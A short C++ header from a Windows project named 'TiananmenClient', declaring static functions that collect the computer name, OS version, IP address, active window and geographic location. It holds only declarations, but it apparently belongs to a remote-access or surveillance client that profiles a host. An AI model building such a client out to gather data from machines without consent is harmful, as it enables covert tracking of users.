//
// Created by LUNAFE on 2022-02-04.
//

#ifndef TIANANMENCLIENT_EVENTHANDLER_H
#define TIANANMENCLIENT_EVENTHANDLER_H

#include <windows.h>
#include <winnt.h>
#include <wininet.h>
#include <winnls.h>
#include "util.h"

class eventhandler {
public:
    static void getComputerName(wchar_t *buf);

    static void getOSVersion(wchar_t *buf);

    static void getIP(wchar_t *buf);

    static void getActiveWindow(wchar_t *buf);

    static void getGeoID(wchar_t *buf);
};


#endif //TIANANMENCLIENT_EVENTHANDLER_H
